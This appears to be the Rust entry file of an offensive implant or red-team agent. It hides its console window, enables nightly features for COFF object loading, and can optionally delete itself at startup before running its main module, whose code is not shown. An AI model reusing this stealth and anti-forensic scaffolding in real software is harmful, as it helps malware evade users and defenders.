// Hide the console window
#![windows_subsystem = "windows"]
// Enable features for COFF loading
#![allow(internal_features)]
#![feature(c_variadic)]
#![feature(core_intrinsics)]

mod app;

#[cfg(feature = "selfdelete")]
use crate::app::self_delete::perform_self_delete;

fn main() {
    #[cfg(feature = "selfdelete")]
    perform_self_delete();

    app::main();
}
